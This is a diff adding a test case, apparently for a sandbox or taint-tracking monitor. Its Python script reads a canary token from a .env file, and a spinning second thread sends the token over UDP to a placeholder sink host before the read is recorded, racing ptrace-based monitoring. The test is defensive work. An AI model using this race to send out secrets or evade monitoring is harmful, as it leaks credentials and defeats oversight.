@@ -1,0 +1,40 @@
+# A secret's bytes are usable before the read that fetched them is recorded. A
+# second thread spins on the buffer and sends it the moment the kernel copies
+# it in, racing the reader's ptrace exit stop. Privileged mode makes the read a
+# taint receipt at file_permission, before the copy.
+name = "thread-window-read-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "window.py"
+contents = """
+import ctypes, os, socket, threading
+libc = ctypes.CDLL(None, use_errno=True)
+libc.read.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t]
+buffer = ctypes.create_string_buffer(128)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+done = threading.Event()
+def spin():
+    while not done.is_set():
+        if buffer.raw[:6] == b'TOKEN=':
+            s.sendto(buffer.raw, ('{SINK_HOST}', {SINK_PORT}))
+            return
+sender = threading.Thread(target=spin)
+sender.start()
+fd = os.open('.env', os.O_RDONLY)
+libc.read(fd, buffer, 128)
+done.set()
+sender.join()
+"""
+
+[[steps]]
+run = "python3 window.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw"]
